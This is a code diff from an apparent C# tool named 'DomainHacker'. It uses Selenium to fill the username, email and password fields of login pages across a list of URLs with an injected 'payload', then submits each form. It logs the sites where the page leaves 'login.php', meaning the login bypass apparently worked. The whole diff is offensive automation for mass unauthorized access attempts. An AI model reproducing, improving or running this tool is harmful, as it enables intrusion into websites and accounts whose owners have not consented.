@@ -47,66 +47,100 @@ namespace DomainHacker
                         driver.SwitchTo().Window(driver.WindowHandles[counter]);
                         driver.Navigate().GoToUrl(url);
 
-                        try
-                        {
-                            driver.FindElement(By.CssSelector("input[type = text]")).SendKeys(payload);
-                        }
-                        catch (Exception)
-                        {
-                            goto USERID;
-                        }
-                    USERID:
-                        try
-                        {
-                            driver.FindElement(By.CssSelector("input[type = email]")).SendKeys(payload);
-                        }
-                        catch (Exception) { }
-
-
-                        driver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);
-
-                        Thread.Sleep(700);
-                        try
-                        {
-                            driver.FindElement(By.CssSelector("input[type = submit]")).Click();
-                        }
-                        catch (Exception)
-                        {
-                            goto SUBMIT1;
-                        }
-                    SUBMIT1:
-                        try
-                        {
-                            driver.FindElement(By.CssSelector("input[type = button]")).Click();
-                        }
-                        catch (Exception)
-                        {
-                            goto SUBMIT2;
-                        }
-                    SUBMIT2:
-                        try
-                        {
-                            driver.FindElement(By.CssSelector("button[type = submit]")).Click();
-                        }
-                        catch (Exception) { }
-
-
 
                         try
                         {
-                            driver.SwitchTo().Alert().Dismiss();
-                        }
-                        catch (Exception)
-                        {
+                            //USER ID/EMAIL/USERNAME
+                            try
+                            {
+                                driver.FindElement(By.CssSelector("input[type = text]")).Clear();
+                                driver.FindElement(By.CssSelector("input[type = text]")).SendKeys(payload);
+                                goto PASSWORD;
+                            }
+                            catch (Exception)
+                            {
+                                goto USERID1;
+                            }
+                        USERID1:
+                            try
+                            {
+                                driver.FindElement(By.CssSelector("input[type = email]")).Clear();
+                                driver.FindElement(By.CssSelector("input[type = email]")).SendKeys(payload);
+                                goto PASSWORD;
+                            }
+                            catch (Exception)
+                            {
+                                goto USERID2;
+                            }
+                        USERID2:
+                            try
+                            {
+                                driver.FindElement(By.CssSelector("input[type = username]")).Clear();
+                                driver.FindElement(By.CssSelector("input[type = username]")).SendKeys(payload);
+                            }
+                            catch (Exception) { }
 
+
+                        //PASSWORD
+                        PASSWORD:
+                            driver.FindElement(By.CssSelector("input[type = password]")).Clear();
+                            driver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);
+
+
+                            Thread.Sleep(700);
+
+
+                            //SUBMIT/BUTTON
+                            try
+                            {
+                                driver.FindElement(By.CssSelector("input[type = submit]")).Click();
+                                goto OUT;
+                            }
+                            catch (Exception)
+                            {
+                                goto SUBMIT1;
+                            }
+                        SUBMIT1:
+                            try
+                            {
+                                driver.FindElement(By.CssSelector("input[type = button]")).Click();
+                                goto OUT;
+                            }
+                            catch (Exception)
+                            {
+                                goto SUBMIT2;
+                            }
+                        SUBMIT2:
+                            try
+                            {
+                                driver.FindElement(By.CssSelector("button[type = submit]")).Click();
+                                goto OUT;
+                            }
+                            catch (Exception) { }
+
+                        OUT:
+                            try
+                            {
+                                driver.SwitchTo().Alert().Dismiss();
+                            }
+                            catch (Exception)
+                            {
+
+                            }
+                            try
+                            {
+                                string currentUrl = driver.Url;
+                                if (!currentUrl.Contains("login.php"))
+                                {
+                                    writer.WriteLine(url + "    " + payload);
+                                    writer.Flush();
+                                    fileStream.Flush();
+                                }
+                            }
+                            catch (Exception) { }
                         }
-                        string currentUrl = driver.Url;
-                        if (!currentUrl.Contains("login.php"))
-                        {
-                            writer.WriteLine(url + "    " + payload);
-                            writer.Flush();
-                            fileStream.Flush();
-                        }
+                        catch (Exception){ continue;  }
+
                         counter++;
                     }
                 }
